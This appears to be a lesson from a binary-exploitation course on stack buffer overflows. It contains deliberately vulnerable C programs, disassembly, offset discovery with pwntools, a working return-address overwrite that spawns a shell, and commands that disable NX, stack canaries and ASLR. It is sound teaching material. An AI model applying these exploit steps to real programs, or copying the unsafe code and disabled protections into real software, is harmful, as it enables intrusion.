# Stack-based Buffer Overflow

Buffer overflow occurs when more data is written to a buffer and overwrites
adjacent memory location.

Let's look at the following vulnerable [source code][1]:

```c
#include <stdio.h>

void main() {
    char name[15];
    char grade = 'F';

    scanf("%16s", name);
    name[14] = 0;
    printf("%s scored %c\n", name, grade);
}
```

The [binary][2] is compiled with the following flags to disable protection
mechanisms:

```shell
gcc -m32 -fno-stack-protector -o ./build/1_grade ./src/1_grade.c
```

`-m32`: Compile the source code into 32-bit binary
`-fno-stack-protector`: Disable stack canaries

The binary reads in 16 bytes character and place it in `name`.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ./1_grade 
hello
hello scored F
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

Let's look at the disasembly to determine the stack layout.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ objdump -d 1_grade
...
0804846b <main>:
 804846b:   8d 4c 24 04             lea    0x4(%esp),%ecx
 804846f:   83 e4 f0                and    $0xfffffff0,%esp
 8048472:   ff 71 fc                pushl  -0x4(%ecx)
 8048475:   55                      push   %ebp
 8048476:   89 e5                   mov    %esp,%ebp
 8048478:   51                      push   %ecx
 8048479:   83 ec 14                sub    $0x14,%esp
 804847c:   c6 45 f7 46             movb   $0x46,-0x9(%ebp)
 8048480:   83 ec 08                sub    $0x8,%esp
 8048483:   8d 45 e8                lea    -0x18(%ebp),%eax
 8048486:   50                      push   %eax
 8048487:   68 40 85 04 08          push   $0x8048540
 804848c:   e8 bf fe ff ff          call   8048350 <__isoc99_scanf@plt>
 8048491:   83 c4 10                add    $0x10,%esp
 8048494:   c6 45 f6 00             movb   $0x0,-0xa(%ebp)
 8048498:   0f be 45 f7             movsbl -0x9(%ebp),%eax
 804849c:   83 ec 04                sub    $0x4,%esp
 804849f:   50                      push   %eax
 80484a0:   8d 45 e8                lea    -0x18(%ebp),%eax
 80484a3:   50                      push   %eax
 80484a4:   68 45 85 04 08          push   $0x8048545
 80484a9:   e8 82 fe ff ff          call   8048330 <printf@plt>
 80484ae:   83 c4 10                add    $0x10,%esp
 80484b1:   90                      nop
 80484b2:   8b 4d fc                mov    -0x4(%ebp),%ecx
 80484b5:   c9                      leave  
 80484b6:   8d 61 fc                lea    -0x4(%ecx),%esp
 80484b9:   c3                      ret    
 80484ba:   66 90                   xchg   %ax,%ax
 80484bc:   66 90                   xchg   %ax,%ax
 80484be:   66 90                   xchg   %ax,%ax
...
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

The stack layout for `main()` looks like this:

```
ESP => |------------|  lower address
       |    ...     |        |
       |------------|        |
       |            |        |
       |  name[15]  |        |
       |            |        |
       |            |        |
       |------------|        |
       |   grade    |        |
       |------------|        |
       |    ...     |        |
EBP => |------------|        |
       |            |        V
       |------------|  higher address
```

Since `name` can only hold 15 bytes, the last byte will overwrite
adjacent memory. We can overwrite the content of `grade` using the
last byte.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ python -c 'print "a" * 15 + "A"' | ./1_grade 
aaaaaaaaaaaaaa scored A
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

Let's try another [binary][3] compiled with the following vulnerable
[source code][4]:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void get_shell() {
    system("/bin/sh");
}

void echo(char* arg) {
    char buffer[16];
    strcpy(buffer, arg);
    printf("%s\n", buffer);
}

int main(int argc, char** argv) {
    echo(argv[1]);
}
```

The binary is compiled with the following flags:

```shell
gcc -m32 -zexecstack -fno-stack-protector -o ./build/2_echo ./src/2_echo.c
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

`-zexecstack`: Mark the stack as executable
`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`: Disable Address
Space Layout Randomization (ASLR)

The binary copies argument 1 to a 16 byte character `buffer` and prints
the content of the buffer.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ./2_echo helloworld
helloworld
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

The vulnerable line is `strcpy(buffer, arg)`. If the argument supplied is
longer than the length of the buffer, adjacent memory in the stack will be
overwritten. We can overwrite the return pointer to change the execution
path of the binary or execute arbitrary code.

Let's look at the disasembly to determine the stack layout.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ objdump -d 1_echo
...
08048484 <echo>:
 8048484:   55                      push   %ebp
 8048485:   89 e5                   mov    %esp,%ebp
 8048487:   83 ec 18                sub    $0x18,%esp
 804848a:   83 ec 08                sub    $0x8,%esp
 804848d:   ff 75 08                pushl  0x8(%ebp)
 8048490:   8d 45 e8                lea    -0x18(%ebp),%eax
 8048493:   50                      push   %eax
 8048494:   e8 87 fe ff ff          call   8048320 <strcpy@plt>
 8048499:   83 c4 10                add    $0x10,%esp
 804849c:   83 ec 0c                sub    $0xc,%esp
 804849f:   8d 45 e8                lea    -0x18(%ebp),%eax
 80484a2:   50                      push   %eax
 80484a3:   e8 88 fe ff ff          call   8048330 <puts@plt>
 80484a8:   83 c4 10                add    $0x10,%esp
 80484ab:   90                      nop
 80484ac:   c9                      leave  
 80484ad:   c3                      ret
...
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$    
```

The stack layout at `0x8048494` before the call to `strcpy()` looks like this:

```
     ESP =>  - |------------| -                        lower address
            |  |  &buffer   |  |                             |
parameters <   |------------|  |                             |
            |  |    &arg    |  |                             |
             - |------------|  |                             |
               |            |  |                             |
               |------------|  |                             |
               |            |  |                             |
             - |------------|  |                             |
            |  |            |   > echo() stack frame         |
 local     <   | buffer[16] |  |                             |
variable    |  |            |  |                             |
            |  |            |  |                             |
             - |------------|  |                             |
               |            |  |                             |
               |------------|  |                             |
               |            |  |                             |
        EBP => |------------|  |                             |
               | saved EBP  |  |                             |
               |------------| =                              |
               | saved EIP  |  |                             |
               |------------|  |                             |
parameter   {  |  &argv[1]  |   > main() stack frame         |
               |------------|  |                             |
               |    ...     |  |                             V
               |------------| -                        higher address
```

Let's see what happens when we supply an argument longer than 16 bytes.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ./2_echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

It causes a segmentation fault. Let's check the kernel log for the
segmentation fault error.

```
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ dmesg | tail -n 1
[35714.281904] 2_echo[9812]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffcf20 error 14 in libc-2.23.so[f7e04000+1af000]
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

The instruction pointer is overwritten with `0x41414141` which is
`AAAA` in hexadecimal.

To gain control of the instruction pointer, we need to find the offset of the
saved return address from the buffer. From the disasembly, the buffer is at
`-0x18(%ebp)`, 24 bytes above the base pointer. The saved return address
is at `0x4(%ebp)`, 4 bytes below the base pointer. Hence, the offset is 28
bytes.

Verifying the offset:

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ./2_echo `python -c 'print "A" * 28 + "BBBB"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Segmentation fault (core dumped)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ dmesg | tail -n 1
[35773.169041] 2_echo[9835]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffcf20 error 14 in libc-2.23.so[f7e04000+1af000]
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

A useful tool to calculate the offset is `cyclic` from Python `pwntools`.
It generates a unique subsequences of default 4 bytes. We can find the offset
by doing a lookup of the value where the binary crashed.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ./2_echo `cyclic 100`
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Segmentation fault (core dumped)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ dmesg | tail -n 1
[36049.898181] 2_echo[9973]: segfault at 61616168 ip 0000000061616168 sp 00000000ffffcee0 error 14 in libc-2.23.so[f7e04000+1af000]
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ cyclic -o 0x61616168
28
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

Since we know the offset of the instruction pointer, we can overwrite it to
the address of `get_shell()`. We need to find its address.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ objdump -d 2_echo | grep get_shell
0804846b <get_shell>:
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

The address of `get_shell()` is `0x0804846b`. The exploit will look like this:

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ./2_echo `python -c 'import struct; ret_address = 0x804846b; print "A" * 28 + struct.pack("I", ret_address)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAk�
$ ls
1_grade  2_echo
$ 
Illegal instruction (core dumped)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

## Buffer Overflow Protection Mechanisms

There are various protection mechanisms to detect buffer overflow or make
it harder to execute arbitrary code due to buffer overflow.

### No-eXecute

No-eXecute (NX), aka Data Execution Prevention (DEP), marks writable regions
of memory as non-executable. The stack and heap are typically marked as
non-executable so that arbitrary code will not be executed in the data memory
segment.

To verify it, we run a binary and find its PID in another terminal.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ps -aux | grep grade
ubuntu   10608  0.0  0.0   2200   436 pts/11   S+   14:35   0:00 ./1_grade
ubuntu   10631  0.0  0.0  14224   988 pts/4    S+   14:35   0:00 grep --color=auto grade
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

Its PID is `10608`. We look at the virtual mapping address ranges of sections
in the binary and their access permissions.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ cat /proc/10608/maps
08048000-08049000 r-xp 00000000 08:01 528955                             /vagrant/lessons/4_buffer_overflow_stack/build/1_grade
08049000-0804a000 r--p 00000000 08:01 528955                             /vagrant/lessons/4_buffer_overflow_stack/build/1_grade
0804a000-0804b000 rw-p 00001000 08:01 528955                             /vagrant/lessons/4_buffer_overflow_stack/build/1_grade
08a32000-08a53000 rw-p 00000000 00:00 0                                  [heap]
f7520000-f76cf000 r-xp 00000000 08:01 527541                             /lib/i386-linux-gnu/libc-2.23.so
f76cf000-f76d0000 ---p 001af000 08:01 527541                             /lib/i386-linux-gnu/libc-2.23.so
f76d0000-f76d2000 r--p 001af000 08:01 527541                             /lib/i386-linux-gnu/libc-2.23.so
f76d2000-f76d3000 rw-p 001b1000 08:01 527541                             /lib/i386-linux-gnu/libc-2.23.so
f76d3000-f76d6000 rw-p 00000000 00:00 0 
f76f0000-f76f2000 rw-p 00000000 00:00 0 
f76f2000-f76f4000 r--p 00000000 00:00 0                                  [vvar]
f76f4000-f76f5000 r-xp 00000000 00:00 0                                  [vdso]
f76f5000-f7717000 r-xp 00000000 08:01 527531                             /lib/i386-linux-gnu/ld-2.23.so
f7717000-f7718000 rw-p 00000000 00:00 0 
f7718000-f7719000 r--p 00022000 08:01 527531                             /lib/i386-linux-gnu/ld-2.23.so
f7719000-f771a000 rw-p 00023000 08:01 527531                             /lib/i386-linux-gnu/ld-2.23.so
ff8da000-ff8fb000 rw-p 00000000 00:00 0                                  [stack]
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

The stack and heap do not have permissions to be executed.

To disable NX, we compile the source code with the following flag:

```shell
gcc -zexecstack -o ./build/1_grade ./src/1_grade.c
```

The stack and heap have permissions to be executed.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ cat /proc/10708/maps
00400000-00401000 r-xp 00000000 08:01 528955                             /vagrant/lessons/4_buffer_overflow_stack/build/1_grade
00600000-00601000 r-xp 00000000 08:01 528955                             /vagrant/lessons/4_buffer_overflow_stack/build/1_grade
00601000-00602000 rwxp 00001000 08:01 528955                             /vagrant/lessons/4_buffer_overflow_stack/build/1_grade
011ea000-0120b000 rwxp 00000000 00:00 0                                  [heap]
7f2f4fcc6000-7f2f4fe85000 r-xp 00000000 08:01 201395                     /lib/x86_64-linux-gnu/libc-2.23.so
7f2f4fe85000-7f2f50085000 ---p 001bf000 08:01 201395                     /lib/x86_64-linux-gnu/libc-2.23.so
7f2f50085000-7f2f50089000 r-xp 001bf000 08:01 201395                     /lib/x86_64-linux-gnu/libc-2.23.so
7f2f50089000-7f2f5008b000 rwxp 001c3000 08:01 201395                     /lib/x86_64-linux-gnu/libc-2.23.so
7f2f5008b000-7f2f5008f000 rwxp 00000000 00:00 0 
7f2f5008f000-7f2f500b5000 r-xp 00000000 08:01 141685                     /lib/x86_64-linux-gnu/ld-2.23.so
7f2f50295000-7f2f50298000 rwxp 00000000 00:00 0 
7f2f502b2000-7f2f502b4000 rwxp 00000000 00:00 0 
7f2f502b4000-7f2f502b5000 r-xp 00025000 08:01 141685                     /lib/x86_64-linux-gnu/ld-2.23.so
7f2f502b5000-7f2f502b6000 rwxp 00026000 08:01 141685                     /lib/x86_64-linux-gnu/ld-2.23.so
7f2f502b6000-7f2f502b7000 rwxp 00000000 00:00 0 
7ffd58289000-7ffd582aa000 rwxp 00000000 00:00 0                          [stack]
7ffd582bc000-7ffd582be000 r--p 00000000 00:00 0                          [vvar]
7ffd582be000-7ffd582c0000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

### Stack Canary

Stack canary is a randomized guard value placed after the local variables of
a stack frame and before the saved return address. The guard value is checked
before a function returns. If the guard value differs from the value provided
by a secure source, the program is terminated. It detects and prevents
stack-based buffer overflow. 

```
|-----------|  lower address
|    ...    |        |
|-----------|        |
|   local   |        |
| variables |        |
|-----------|        |
|    ...    |        |
|-----------|        |
|  canary   |        |
|-----------|        |
|    ...    |        |
|-----------|        |
| saved EIP |        |
|-----------|        |
|    ...    |        V
|-----------|  higher address
```

The check looks like this:

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ objdump -d 1_grade
...
00000000004005f6 <main>:
...
  400646:   48 8b 45 f8             mov    -0x8(%rbp),%rax
  40064a:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax
  400651:   00 00 
  400653:   74 05                   je     40065a <main+0x64>
  400655:   e8 56 fe ff ff          callq  4004b0 <__stack_chk_fail@plt>
  40065a:   c9                      leaveq 
  40065b:   c3                      retq
...
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

To disable stack canaries, we compile the source code with the following flag:

```shell
gcc -fno-stack-protector -o ./build/1_grade ./src/1_grade.c
```

### Address Space Layout Randomization

Address Space Layout Randomization (ASLR) randomizes the addresses of the memory
regions that are mapped to shared libraries, stack and heap. It makes it more
difficult for attackers to execute arbitrary code since they cannot predict with
certainty where their payload is located at. Hence, the exploit will not work
reliably.

ASLR is enabled by default. We can use the following command to enable it:

```shell
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Verifying ASLR is enabled:

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ldd 1_grade 
    linux-gate.so.1 =>  (0xf770a000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7536000)
    /lib/ld-linux.so.2 (0x565ab000)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ldd 1_grade 
    linux-gate.so.1 =>  (0xf77a3000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf75cf000)
    /lib/ld-linux.so.2 (0x5664d000)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ldd 1_grade 
    linux-gate.so.1 =>  (0xf77d9000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7605000)
    /lib/ld-linux.so.2 (0x5659c000)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

To disable ASLR, use the following command:

```shell
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Verifying ASLR is disabled:

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ldd 1_grade 
    linux-gate.so.1 =>  (0xf7ffd000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e29000)
    /lib/ld-linux.so.2 (0x56555000)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$ ldd 1_grade 
    linux-gate.so.1 =>  (0xf7ffd000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e29000)
    /lib/ld-linux.so.2 (0x56555000)
ubuntu@ubuntu-xenial:/vagrant/lessons/4_buffer_overflow_stack/build$
```

[1]: ./build/1_grade
[2]: ./src/1_grade.c
[3]: ./build/2_echo
[4]: ./src/2_echo.c
